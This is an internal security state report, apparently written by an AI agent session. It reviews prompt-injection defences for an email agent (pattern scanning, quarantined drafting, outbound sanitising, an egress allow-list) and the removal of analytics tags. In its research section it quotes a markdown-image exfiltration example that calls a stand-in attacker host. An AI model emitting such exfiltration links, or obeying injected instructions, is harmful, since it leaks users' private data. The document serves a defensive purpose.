# BP26-PROMPT-INJECTION-1 and BP26-NO-TRACKING-1: research and state (2026-10-28)

Charter pillar: security. Issues 4455 (prompt injection) and 4421 (tracking). Written by session-bp26-security-track.
This file is separate from docs/BP26-SECURITY-CLUSTER.md only because that file was under another session's claim on 2026-10-28; fold it in once free.

## 1. Research: what the primary sources say

Sources (named from the session's background knowledge, not re-fetched in this session; re-read before relying on a quoted detail):
- OWASP Top 10 for LLM Applications 2025, LLM01 Prompt Injection (genai.owasp.org). Direct and indirect injection; mitigations: constrain model behaviour, validate output formats,
  input and output filtering, least privilege for the model's tools, human approval for high-risk actions, segregate and mark external content, adversarial testing.
- OWASP Agentic AI threats and mitigations guide (genai.owasp.org, 2025): goal hijack, tool misuse, memory poisoning, privilege compromise; mitigations are scoped tool permissions, allow-listed egress, action logging.
- Willison, the dual-LLM pattern (2023) and the "lethal trifecta" (2025): private data, untrusted content and an exfiltration channel in one agent is unsafe; remove one leg.
- Beurer-Kellner et al., "Design Patterns for Securing LLM Agents against Prompt Injections" (arXiv 2506.08837, 2025) and Debenedetti et al., CaMeL (arXiv 2503.18813): a model that reads
  untrusted text gets no tools (quarantined), a privileged planner never reads it, data flows are checked by code.
- Markdown-image exfiltration (Rehberger, 2023 onward): a model told to write `![x](https://attacker/?q=SECRET)` leaks through the reader's image fetch; fix is to strip images and non-allow-listed URLs from output.
- EU AI Act Art. 15 (accuracy, robustness, cybersecurity incl. resilience to attempts to alter use by third parties) frames this as a legal duty for high-risk systems; the fleet's email agent is not high-risk but follows the control set.

## 2. Current state (read in this session)

Measured 2026-10-28 from qnfo-audit metric_registry: injection_eval_pass_rate 1, outbound_mail_to_non_sender 0, agent_tool_calls_outside_allowlist 44 (before this change).
`node qnfo-email/injection-redteam.test.mjs` prints `INJECTION_EVAL pass=69 total=69`.

What exists in qnfo-email 2.12.x (code, block BP26-PROMPT-INJECTION-1 in qnfo-email/worker.js; qnfo-email-orchestrator is FOLDED and holds no live code):

| Control | Where | Pattern |
|---|---|---|
| Inbound scan with weighted patterns (override, prompt reveal, chat template, tool-call JSON, markdown image, exfil-forward, encoded runs); score 3 or more keeps the mail away from every model and sends it to the owner (tier 3) | INJ_PATTERNS, injScan | input filtering |
| Invisible-character and HTML stripping, `untrusted_email` wrapper with the closing tag neutralised, fixed SECURITY RULES system block | injSanitizeInbound, injWrap, INJ_RULES | segregate and mark |
| The drafting model is tool-less: the quarantined-reader half of dual-LLM; the output is text only | voiceAi | quarantine |
| Outbound sanitiser: removes markdown images, active HTML, data URIs, non-grounded URLs, foreign addresses, secret-shaped strings; any removal holds the draft for the owner | injSanitizeOutbound, injDrainGuard | output filtering |
| Prompt-leak check (8-word runs of the voice document) | injLeaksPrompt | output filtering |
| Reply goes only to the sender of the mail answered (queue drain) and /send refuses a reply to anyone but the original sender or the owner; an agent surface may cold-send only to owner, fleet domains or agent_send_allowlist | injSendDecision, injSendGuard, injDrainGuard | least privilege on the actuator |
| Violation, trace and alert rows (email_send_violations, agent_mail_trace, one owner notice an hour) | injViolation, injTrace | logging |
| Kill switch `ops_config agent_send_policy` = off | control_registry | rollback path |
| Tool allow-list (tool names per surface, egress hosts) measured hourly | agent_tool_allowlist, scripts/bp26_agentsec.py | allow-listed tools |

Result of the review requested in issue 4455: reply-only-to-original-sender enforcement and markdown-image stripping already exist and are tested, so no email-worker code change was made (a duplicate would add risk, not control).

## 3. Egress allow-list review (44 fetches, 13 hosts)

The collector scripts/bp26_agentsec.py reads `agent_tool_allowlist` (`SELECT surface, kind, pattern ... WHERE enabled = 1`, function collect_tool_calls); a host matches a row when it equals it or is a subdomain of it. All 44 were fetches; no tool name was outside the list.
migrations/2026-10-28-bp26-egress-allowlist-and-ga-removal.sql adds 13 rows with a note each: isitagentready.com (20), academictransfer.com (9), linkedin.com (3), sre.google (2), ubc.ca,
tilburguniversity.edu, kit.edu, sciforum.net, open-meteo.com, worldtimeapi.org, cloudflarestatus.com, agentskills.io, example.com (1 each). All are read-only GETs of public pages. Nothing that accepts data from the caller was allowed (no webhook, paste or request-catcher host, no shared hosting suffix).
Prediction: next hourly run reads agent_tool_calls_outside_allowlist 0 unless new hosts appear; a new host appears as a row `egress-host:<h>` and is reviewed the same way.

## 4. Gaps (each has an owner)

1. The allow-list is measured, not enforced: a fetch to an unlisted host still runs. Enforcement belongs in qnfo-ops web_fetch and qnfo-tools-mcp web_fetch (code-task, not done here: both are control-plane files). Even enforced, an allowed host can carry data in a query string; the real defence is that the readers of untrusted content have no private data.
2. The research pipelines that read web pages are not split into reader and planner (dual-LLM is only in the email drafter). The agents with shell and fetch tools in one context hold the lethal trifecta; this is the largest open risk and needs a design, not a patch.
3. No red-team cases for indirect injection through fetched web pages (only email). Add them to scripts/bp26_agentsec.py's suite when gap 2 is designed.
4. Limits of this measurement: shell_exec and container network access is not attributable to a host from the log.

## 5. BP26-NO-TRACKING-1 state

Live on 2026-10-28 (collector evidence in bp26_probe_results): Google tag G-LV7RHRVW6R on qnfo.org, papers.qnfo.org, ideas.qnfo.org, archive.qnfo.org; G-3VW2SVSSRH was reported on ask.qwav.tech at 12:23Z, but a GET of ask.qwav.tech at 12:35Z with the collector's own user agent found no gtag (no source in the repository carries it), so that row should clear on the next run.
- archive.qnfo.org: tag removed from qnfo-web-unified/archive-qnfo.html in this change (deployed by deploy-pages-qnfo-publications.yml).
- ideas.qnfo.org (idea-hub) and qnfo.org / papers.qnfo.org (qnfo-gateway): files under other sessions' claims; two agent_issues rows with code-task lines were filed by the migration above (set GA4_TAG to the empty string, which is the only use).
- qnfo-fleet-dashboard only reads the GA4 Data API (no page tag) and needs no change. Removing the tags stops the GA4 property receiving data, so `ga4-ingest` figures will fall to zero; the headline pageviews come from Cloudflare Web Analytics.
- No Cloudflare Web Analytics site token exists in the repository, and the beacon is injected at the edge (auto setup), so no beacon was added.
- ipatent_ab: already cookieless in qnfo-ipatent 3.19.1 (a stale cookie is deleted once; no new one is set); the collector's cookie rule matches only code that sets it with a value, which no longer exists.
